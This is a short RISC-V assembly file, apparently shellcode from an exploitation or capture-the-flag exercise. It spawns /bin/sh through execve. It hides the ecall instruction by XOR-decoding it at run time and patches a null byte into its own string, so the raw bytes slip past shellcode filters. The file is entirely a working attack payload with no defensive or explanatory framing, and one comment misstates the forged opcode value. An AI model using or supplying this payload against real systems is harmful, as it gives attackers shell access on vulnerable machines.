.section .text
.global _start

_start:
	c.j getaddr
    binsh:
        .byte 0xff
        .ascii "/bin/sh"
	main:
        # forge ecall instruction (0x000000e3)
        # *ecall ^= 0xffffffff
        c.li s0, -1 # s0 = 0xffffffff
        lw s1, -0x8(ra)
        xor s1, s0, s1
        sw s1, -0x8(ra)

	    # execve("/bin/sh", NULL, NULL)
        li a2, 0
        li a1, 0

        sb a1, -0x26(ra)
        addi a0, ra, -0x2d

        li a7, 221 # SYS_execve

        c.j ecall # Needed, else it crashes

        ecall:
            .byte 0x8c, 0xff, 0xff, 0xff

        getaddr:
            call main

